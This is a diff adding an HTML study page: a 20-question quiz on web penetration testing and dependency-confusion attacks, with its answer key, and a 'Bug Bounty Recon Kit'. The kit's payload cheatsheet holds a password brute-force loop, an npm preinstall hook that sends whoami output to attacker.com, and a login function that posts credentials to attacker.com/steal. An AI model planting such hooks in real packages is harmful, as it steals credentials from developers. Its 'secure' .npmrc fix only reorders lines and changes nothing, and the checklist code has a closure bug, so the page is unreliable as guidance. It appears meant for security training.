@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>WVAPT & Supply Chain — Cyber Exam</title>
+<style>
+:root{
+  --bg:#050a0e; --panel:#0a1419; --line:#1a2b33;
+  --text:#a7c0c6; --dim:#4f6d75; --accent:#00ff9d; --bad:#ff2a6d;
+  --mono:'JetBrains Mono','Fira Code','Consolas',monospace;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;}
+.wrap{max-width:720px;margin:0 auto;padding:32px 20px 60px;}
+.tag{color:var(--accent);letter-spacing:.15em;font-size:12px;text-transform:uppercase;font-weight:bold;text-shadow:0 0 5px var(--accent);}
+h1{font-size:22px;margin:6px 0 26px;color:#fff;text-shadow:0 0 8px rgba(255,255,255,0.3);}
+.bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-bottom:22px;}
+.bar>div{height:100%;background:var(--accent);transition:width .3s;box-shadow:0 0 10px var(--accent);}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;box-shadow:0 0 20px rgba(0,0,0,0.5);}
+.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;}
+.qtext{font-size:16px;color:#fff;margin-bottom:18px;line-height:1.5;}
+.opt{display:block;width:100%;text-align:left;background:#080f12;border:1px solid var(--line);
+  color:var(--text);padding:12px 14px;border-radius:7px;margin-bottom:10px;cursor:pointer;
+  font-family:var(--mono);font-size:13.5px;transition:.15s;}
+.opt:hover{border-color:var(--accent);background:#0f1c20;box-shadow:0 0 8px rgba(0,255,157,0.2);}
+.opt.correct{background:#0a2e22;border-color:var(--accent);color:var(--accent);text-shadow:0 0 5px var(--accent);}
+.opt.wrong{background:#2e0a1a;border-color:var(--bad);color:var(--bad);text-shadow:0 0 5px var(--bad);}
+.opt[disabled]{cursor:default;}
+.score{color:var(--dim);font-size:13px;}
+.center{text-align:center;}
+.big{font-size:44px;color:var(--accent);margin:10px 0;text-shadow:0 0 15px var(--accent);animation:glitch 1s infinite linear alternate-reverse;}
+.btn{background:var(--accent);color:#050a0e;border:none;padding:12px 20px;border-radius:7px;
+  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;}
+.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);box-shadow:0 0 5px rgba(0,255,157,0.3);}
+.emoji{font-size:26px;position:fixed;top:-30px;animation:fall linear forwards;pointer-events:none;z-index:9999;text-shadow:0 0 10px var(--accent);}
+@keyframes fall{to{transform:translateY(105vh) rotate(360deg);opacity:.2;}}
+@keyframes glitch{
+  0% { transform: skew(0deg); text-shadow: 0 0 15px var(--accent); }
+  25% { transform: skew(1deg); text-shadow: -2px 0 var(--bad), 2px 0 var(--accent); }
+  50% { transform: skew(0deg); text-shadow: 0 0 20px var(--accent); }
+  75% { transform: skew(-1deg); text-shadow: 2px 0 var(--bad), -2px 0 var(--accent); }
+  100% { transform: skew(0deg); text-shadow: 0 0 15px var(--accent); }
+}
+h2{color:#fff;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;}
+h3{color:var(--accent);font-size:14px;margin-top:20px;margin-bottom:5px;text-shadow:0 0 5px rgba(0,255,157,0.5);}
+.chk{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
+.chk input{margin-top:3px;accent-color:var(--accent);}
+.chk.done label{color:var(--dim);text-decoration:line-through;}
+pre{background:#080f12;border:1px solid var(--line);border-radius:7px;padding:12px 14px;
+  overflow-x:auto;font-size:12.5px;color:#e6edf3;margin:8px 0 4px;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);}
+.pname{color:var(--accent);font-size:12.5px;margin-top:16px;}
+#quizView,#kitView{display:none;}
+.explain{margin-top:12px;padding:12px 14px;background:#080f12;border:1px solid var(--line);
+  border-radius:7px;font-size:13px;color:var(--dim);line-height:1.5;display:none;}
+.explain b{color:var(--accent);}
+.topbtn{margin-bottom:18px;}
+#nextBtn{display:none;margin-top:16px;}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="tag">WVAPT // Supply Chain Exploitation</div>
+  <h1 id="pageTitle">Concept Check — 20 Questions</h1>
+
+  <div id="quizView">
+    <button class="btn alt topbtn" onclick="showKit()">Skip → Bug Bounty Checklist + Payloads</button>
+    <div class="bar"><div id="prog" style="width:0%"></div></div>
+    <div class="card">
+      <div class="qnum"><span id="qIndex">1</span>/20 &nbsp;·&nbsp; <span class="score">score: <span id="scoreLive">0</span></span></div>
+      <div class="qtext" id="qText"></div>
+      <div id="opts"></div>
+      <div class="explain" id="explain"></div>
+      <button class="btn" id="nextBtn" onclick="goNext()">Next →</button>
+    </div>
+  </div>
+
+  <div id="doneView" class="card center" style="display:none;">
+    <div class="tag">Result</div>
+    <div class="big"><span id="finalScore">0</span>/20</div>
+    <div id="finalMsg" style="color:var(--dim);margin-bottom:16px;"></div>
+    <button class="btn" onclick="restart()">Retake Exam</button>
+    <button class="btn alt" onclick="showKit()">Bug Bounty Checklist + Payloads →</button>
+  </div>
+
+  <div id="kitView">
+    <button class="btn alt" onclick="showQuiz()">← Back to Exam</button>
+
+    <h2>Recon Checklist</h2>
+    <div id="checklist"></div>
+
+    <h2>Payload Cheatsheet</h2>
+    <div id="payloads"></div>
+  </div>
+</div>
+
+<script>
+const Q=[
+["What is the primary difference between VA and PT in WVAPT?",["VA lists weaknesses via scanning; PT actively exploits them to prove impact","VA patches vulnerabilities; PT writes the documentation for the fixes","VA executes malicious code; PT identifies the network boundaries","VA bypasses firewalls; PT scans for open ports on the target server"],0,
+"Vulnerability Assessment (VA) is just finding and listing problems. Penetration Testing (PT) is actually trying to break in through them safely to prove they matter."],
+["How is a 'vulnerability' best defined in web application security?",["A mistake or weakness in how an application was built or configured","A malicious script executed by an attacker on a backend server","A network firewall rule that blocks legitimate user traffic","An encryption algorithm that is too complex to decrypt quickly"],0,
+"A vulnerability is simply a mistake or weakness in how a website/app was built, configured, or maintained that an attacker could take advantage of."],
+["In the house analogy, what constitutes the 'exploitation' phase?",["A burglar walking in through the broken lock or open window","The broken lock on the front door of the house itself","The security guard patrolling the perimeter of the property","The act of installing a new deadbolt on the front door"],0,
+"The broken lock is the vulnerability. The burglar walking in through that broken lock is the exploitation of that vulnerability."],
+["What are the two essential parts of every vulnerability?",["The weakness itself and how it can be abused by an attacker","The network port and the protocol used to exploit it remotely","The payload size and the encryption algorithm used to hide it","The firewall rule and the IP address of the target machine"],0,
+"Every vulnerability has the weakness itself (what was missed) and how it can be abused (what an attacker does with it)."],
+["In the missing login lockout example, what is the vulnerability?",["The developer forgetting to add a limit on incorrect login attempts","The attacker writing a script to guess thousands of passwords","The database failing to handle concurrent login requests properly","The server using weak hashing algorithms for storing user passwords"],0,
+"The missing limit is the vulnerability. The attacker using a script to guess passwords is the exploitation of that vulnerability."],
+["What does a 'Dependency Confusion' attack primarily target?",["Trust in third-party components and package management registries","Weak access controls in cloud storage buckets and databases","Misconfigured CORS policies in modern web applications","Insecure deserialization flaws in backend server architecture"],0,
+"Dependency Confusion is a supply chain attack targeting the trust developers place in public and private package registries."],
+["How does an attacker execute a Dependency Confusion attack?",["By uploading a malicious public package matching a private name","By intercepting network traffic between the client and server","By exploiting a zero-day vulnerability in the web server software","By injecting malicious scripts into a frontend HTML file directly"],0,
+"The attacker uploads a fake public package with the exact same name as a company's private internal package."],
+["Why does the developer's installer choose the malicious package?",["It checks the public registry first and finds a higher version number","It is configured to ignore all private registries during deployment","It verifies the package using a compromised digital signature","It prioritizes packages with smaller file sizes for faster installs"],0,
+"The vulnerable installer checks the public registry first. Finding a package with the same name and a higher version, it installs the malicious one."],
+["What is the actual 'payload' in a Dependency Confusion attack?",["Naming the malicious public package identically to the private one","Injecting a reverse shell script into the main HTML landing page","Sending a crafted HTTP header to bypass the origin validation logic","Uploading a web shell to the server via an insecure file upload form"],0,
+"The payload isn't code you paste into a browser; it's simply naming the malicious package identically to the private one with a higher version."],
+["What happens when the malicious dependency is installed and run?",["It silently executes attacker code while appearing normal to the developer","It crashes the server immediately causing a denial of service attack","It encrypts the local file system demanding a ransom from the company","It alters the firewall rules to block all incoming network traffic entirely"],0,
+"In real life, the malicious code would steal credentials or data and send it to the attacker, while the developer thinks everything is normal."],
+["Why is Dependency Confusion classified as a supply chain failure?",["It compromises the trusted components and tools used to build software","It targets the end users via sophisticated phishing email campaigns","It exploits network routers to intercept and alter traffic routing","It targets the database servers to exfiltrate sensitive customer data"],0,
+"It targets the supply chain—the external libraries, packages, and tools that developers rely on to build their applications."],
+["What is the most secure way to prevent Dependency Confusion?",["Configuring installers to check private registries before public ones","Encrypting all network traffic using TLS 1.3 protocol strictly","Disabling all third-party packages and writing all code from scratch","Using complex passwords and enabling multi-factor authentication globally"],0,
+"If the installer checks the private registry first, it will find the legitimate internal package and ignore the malicious public one."],
+["What does WVAPT stand for in the context of security assessments?",["Web Application Vulnerability Assessment and Penetration Testing","Wireless Application Verification and Protocol Testing","Web Authentication Vulnerability Analysis and Patch Testing","Workplace Application Verification and Penetration Testing"],0,
+"WVAPT stands for Web (Application) Vulnerability Assessment and Penetration Testing."],
+["What is the main goal of Vulnerability Assessment (VA)?",["To scan and make a list of weaknesses without breaking in","To actively exploit weaknesses and prove they are real threats","To patch identified vulnerabilities and secure the application","To simulate a real attacker trying to breach the network"],0,
+"VA is like a health checkup: you scan a website and make a list of weaknesses. You're not breaking in, just finding problems."],
+["What is a key requirement for Penetration Testing (PT)?",["It must be done safely with permission and documented thoroughly","It must be performed without any prior knowledge of the target system","It must bypass all network firewalls to access the internal infrastructure","It must delete all logs to prevent detection by the security team"],0,
+"In PT, you try to exploit weaknesses to prove they are real, just like a real attacker would, but with permission, documenting everything so it can be fixed."],
+["In the simulation, what represents the attacker's fake package?",["A public package with the same name but a higher version number","A private package with a different name but a lower version number","A local script that deletes the legitimate package from the registry","A network payload that intercepts the installation traffic remotely"],0,
+"The attacker uploads a fake public package with the exact same name as the company's internal package, but with a higher version number."],
+["What is the risk of missing rate limiting on a login form?",["Allowing attackers to brute force passwords via automated scripts","Allowing attackers to execute arbitrary code on the backend server","Allowing attackers to steal session cookies via cross-site scripting","Allowing attackers to bypass authentication via SQL injection flaws"],0,
+"If the developer forgot to add a lockout limit, an attacker can sit there and try thousands of passwords per second using a script."],
+["What does the OWASP Top 10 primarily represent?",["A famous list of the most common and critical web app security risks","A set of tools used for automated vulnerability scanning and patching","A collection of firewall rules designed to block malicious network traffic","A standard encryption protocol used for securing web communication"],0,
+"The OWASP Top 10 is a famous list of the most common/critical web application security risks."],
+["In the context of supply chain security, what is a 'registry'?",["A repository where software packages are stored and retrieved from","A database that stores user credentials and sensitive personal data","A network device that routes traffic between different subnets securely","A server that hosts the frontend HTML, CSS, and JavaScript files"],0,
+"A registry is where packages (like npm or PyPI) are hosted. Companies use private registries for internal code and public ones for open-source."],
+["Why is exploitation necessary during a penetration test?",["To prove the weakness is real and see how bad the damage could be","To automatically patch the vulnerability and secure the application","To map the network infrastructure and identify active IP addresses","To encrypt the sensitive data before an attacker can steal it"],0,
+"You actually try to exploit those weaknesses to prove they are real and see how bad the damage could be, just like a real attacker would."],
+["What is the core flaw in a system vulnerable to Dependency Confusion?",["The installer prioritizes public packages over private ones incorrectly","The installer fails to verify the digital signature of the downloaded files","The installer uses unencrypted HTTP to download packages from the registry","The installer allows packages with duplicate names to overwrite each other"],0,
+"The vulnerable logic checks the public registry first. If a malicious package exists there with a higher version, it overrides the private one."]
+];
+
+const CHECKLIST_DATA = [
+  { title: "1. Vulnerability Assessment (VA) Phase", items: [
+    "Check login/signup forms for missing rate limiting (brute force potential)",
+    "Scan for outdated software versions on web servers and frameworks",
+    "Identify misconfigurations in security headers (CORS, CSP, HSTS)"
+  ]},
+  { title: "2. Penetration Testing (PT) Phase", items: [
+    "Attempt to exploit found weaknesses safely with explicit permission",
+    "Verify if the vulnerability allows unauthorized access or data theft",
+    "Document the exact steps taken and the real-world impact of the exploit"
+  ]},
+  { title: "3. Supply Chain Recon", items: [
+    "Identify private/internal package names used by the organization (e.g., via leaked <code>package.json</code>)",
+    "Search public registries (npm, PyPI, RubyGems) for identical package names",
+    "Analyze <code>.npmrc</code> or <code>pip.conf</code> files for registry precedence misconfigurations"
+  ]},
+  { title: "4. Dependency Confusion Exploitation", items: [
+    "Create a malicious public package matching the private package name",
+    "Assign a higher semantic version number to the malicious package",
+    "Upload the package to the public registry and wait for the CI/CD pipeline to run"
+  ]},
+  { title: "5. Remediation & Prevention", items: [
+    "Ensure installers check private registries before public ones",
+    "Use scoped packages (e.g., <code>@company/package-name</code>) to prevent name collisions",
+    "Implement strict package signing and verification in the CI/CD pipeline"
+  ]}
+];
+
+const PAYLOADS = [
+  { name: "1. Missing Rate Limit (Brute Force)", code: "for i in $(cat passwords.txt); do\n  curl -X POST https://target.com/login -d \"user=admin&pass=$i\"\ndone" },
+  { name: "2. Dependency Confusion Setup (Registry Config)", code: "// Vulnerable .npmrc file\nregistry=https://registry.npmjs.org/\n@company:registry=https://internal.company.com/\n// Installs public packages first, allowing override" },
+  { name: "3. Malicious Package (package.json)", code: "{\n  \"name\": \"company-auth-utils\",\n  \"version\": \"99.0.0\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"preinstall\": \"curl https://attacker.com/pwn?data=$(whoami)\"\n  }\n}" },
+  { name: "4. Malicious Payload (index.js)", code: "module.exports = {\n  login: function(user, pass) {\n    fetch('https://attacker.com/steal', {\n      method: 'POST', body: JSON.stringify({user, pass})\n    });\n    return true;\n  }\n};" },
+  { name: "5. Secure Registry Config (Fix)", code: "// Secure .npmrc file\n@company:registry=https://internal.company.com/\nregistry=https://registry.npmjs.org/\nalways-auth=true\n// Forces private lookup first for scoped packages" }
+];
+
+let cur=0,score=0;
+
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
+
+function renderQ(){
+  document.getElementById('prog').style.width=(cur/Q.length*100)+'%';
+  document.getElementById('qIndex').textContent=cur+1;
+  document.getElementById('scoreLive').textContent=score;
+  const [text,opts,correctIdx,why]=Q[cur];
+  document.getElementById('qText').textContent=text;
+  const exp=document.getElementById('explain');
+  exp.style.display='none';exp.innerHTML='';
+  let arr=opts.map((o,i)=>({o,correct:i===correctIdx}));
+  shuffle(arr);
+  const box=document.getElementById('opts');
+  box.innerHTML='';
+  arr.forEach(item=>{
+    const b=document.createElement('button');
+    b.className='opt';b.textContent=item.o;
+    b.onclick=()=>pick(b,item.correct,box,item.o,why,arr);
+    box.appendChild(b);
+  });
+  document.getElementById('nextBtn').style.display='none';
+}
+
+function pick(btn,isCorrect,box,pickedText,why,arr){
+  [...box.children].forEach(c=>c.disabled=true);
+  const exp=document.getElementById('explain');
+  if(isCorrect){
+    btn.classList.add('correct');score++;
+    exp.innerHTML=`<b>Correct.</b> ${why}`;
+  }else{
+    btn.classList.add('wrong');
+    const correctText=arr.find(a=>a.correct).o;
+    [...box.children].forEach(c=>{if(c.textContent===correctText)c.classList.add('correct');});
+    exp.innerHTML=`<b>Correct answer:</b> ${correctText}<br>${why}`;
+  }
+  exp.style.display='block';
+  document.getElementById('scoreLive').textContent=score;
+  const nb=document.getElementById('nextBtn');
+  nb.style.display='inline-block';
+  nb.textContent=(cur+1<Q.length)?'Next →':'See Results →';
+}
+
+function goNext(){
+  cur++;
+  if(cur<Q.length)renderQ();else finish();
+}
+
+function finish(){
+  document.getElementById('prog').style.width='100%';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('doneView').style.display='block';
+  document.getElementById('finalScore').textContent=score;
+  const msg=score===20?"ACCESS GRANTED. System fully compromised.":
+    score>=15?"Solid grasp — revisit the weak spots.":
+    score>=10?"Halfway there — reread the tricky sections.":
+    "Go back through the concept steps before diving into labs.";
+  document.getElementById('finalMsg').textContent=msg;
+  if(score===20) confetti();
+}
+
+function confetti(){
+  const em=['👾','💻','⚡','💀','🚨'];
+  for(let i=0;i<30;i++){
+    setTimeout(()=>{
+      const s=document.createElement('div');
+      s.className='emoji';s.textContent=em[Math.floor(Math.random()*em.length)];
+      s.style.left=Math.random()*100+'vw';
+      s.style.animationDuration=(2+Math.random()*1.5)+'s';
+      document.body.appendChild(s);
+      setTimeout(()=>s.remove(),4000);
+    },i*60);
+  }
+}
+
+function restart(){
+  cur=0;score=0;
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('quizView').style.display='block';
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+  renderQ();
+}
+
+let cameFromDone=false;
+function showKit(){
+  cameFromDone=document.getElementById('doneView').style.display==='block';
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('kitView').style.display='block';
+  document.getElementById('pageTitle').textContent='Bug Bounty Recon Kit';
+}
+function showQuiz(){
+  document.getElementById('kitView').style.display='none';
+  if(cameFromDone){
+    document.getElementById('doneView').style.display='block';
+  }else{
+    document.getElementById('quizView').style.display='block';
+  }
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+}
+
+function buildChecklist(){
+  const c=document.getElementById('checklist');
+  const saved=JSON.parse(localStorage.getItem('wvapt_cyber_v2')||'{}');
+  let html='';
+  let idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    html += `<h3>${section.title}</h3>`;
+    section.items.forEach(item => {
+      const isChecked = saved[idx] ? 'checked' : '';
+      const isDone = saved[idx] ? ' done' : '';
+      html += `<div class="chk${isDone}">
+        <input type="checkbox" id="c${idx}" ${isChecked}>
+        <label for="c${idx}">${item}</label>
+      </div>`;
+      idx++;
+    });
+  });
+  c.innerHTML = html;
+  
+  idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    section.items.forEach(item => {
+      const checkbox = document.getElementById(`c${idx}`);
+      const row = checkbox.parentElement;
+      checkbox.onchange = e => {
+        saved[idx] = e.target.checked;
+        localStorage.setItem('wvapt_cyber_v2', JSON.stringify(saved));
+        row.classList.toggle('done', e.target.checked);
+      };
+      idx++;
+    });
+  });
+}
+
+function buildPayloads(){
+  const p=document.getElementById('payloads');
+  let html='';
+  PAYLOADS.forEach(item => {
+    html += `<div class="pname">${item.name}</div><pre>${item.code}</pre>`;
+  });
+  p.innerHTML = html;
+}
+
+document.getElementById('quizView').style.display='block';
+renderQ();
+buildChecklist();
+buildPayloads();
+</script>
+</body>
+</html>
